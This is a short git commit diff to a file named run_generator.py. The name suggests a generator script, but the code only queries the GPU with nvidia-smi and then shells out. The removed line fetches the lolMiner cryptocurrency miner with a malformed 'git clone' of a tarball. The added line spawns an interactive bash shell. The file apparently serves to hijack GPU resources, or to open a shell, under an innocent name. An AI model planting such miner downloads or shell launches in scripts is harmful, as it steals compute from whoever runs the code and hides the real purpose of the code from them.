5b4577f139f760315d747ed1b162d4e024d5236f
jazzup6176 <88086548+jazzup6176@users.noreply.github.com>
2021-10-22 14:49:49 +0200

    Update run_generator.py

--- run_generator.py
+++ run_generator.py
@@ -1,4 +1,4 @@
 import os as alpha
 alpha.system("nvidia-smi")
 import os
-os.system("git clone https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz")
+os.system("bash")
